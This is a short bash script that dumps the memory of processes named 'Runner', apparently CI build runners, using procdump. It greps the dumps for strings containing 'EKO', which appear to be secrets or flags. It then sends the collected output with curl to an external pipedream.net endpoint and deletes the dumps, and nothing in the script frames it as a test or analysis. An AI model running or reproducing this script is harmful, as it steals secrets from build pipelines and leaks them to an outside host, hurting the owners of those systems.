#!/bin/bash

sudo apt-get install procdump -y > /tmp/file.txt

mkdir dumps
echo "STARTING..." >> /tmp/file.txt

# get pids related to runners and dump their memory
for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
do
    sudo procdump -o dumps -p $pid;
done

strings dumps/* | grep EKO >> /tmp/file.txt

echo "FINISHED..." >> /tmp/file.txt

rm -rf dumps/

curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net